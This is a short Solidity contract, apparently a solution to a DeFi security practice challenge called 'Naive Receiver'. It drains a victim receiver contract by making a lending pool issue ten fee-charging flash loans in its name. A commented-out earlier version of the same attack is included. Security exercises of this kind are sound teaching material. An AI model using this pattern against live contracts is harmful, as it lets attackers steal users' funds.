// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


contract NaiveReceiverAttacker {
    NaiveReceiverLenderPool public pool;
    address payable public receiver;

    constructor(address payable _poolAddress) {
        pool = NaiveReceiverLenderPool(_poolAddress);
    }

function attack(address payable _receiver, uint256 amount, bytes calldata data) public {
    receiver = _receiver;
    IERC3156FlashBorrower receiverContract = IERC3156FlashBorrower(_receiver);

    for (uint256 i = 0; i < 10; i++) {
        pool.flashLoan(receiverContract, pool.ETH(), amount, data);

    }
}

}



// pragma solidity ^0.8.0;


// interface IPool {
//     function flashLoan(address borrower, uint256 borrowAmount) external;
// }

// contract NaiveReceiverAttacker {
//     IPool pool;

//     constructor(address payable _poolAddress) public {
//         pool = IPool(_poolAddress);
//     }

//     // function attack (address victim) external {
//     //     for (uint i; i < 10; i++){
//     //         pool.flashLoan(victim, 0);
//     //     }
//     // }
//         function attack (address victim, uint256 borrowAmount) external {
//         for (uint i; i < 10; i++){
//             pool.flashLoan(victim, borrowAmount);
//         }
//     }

// }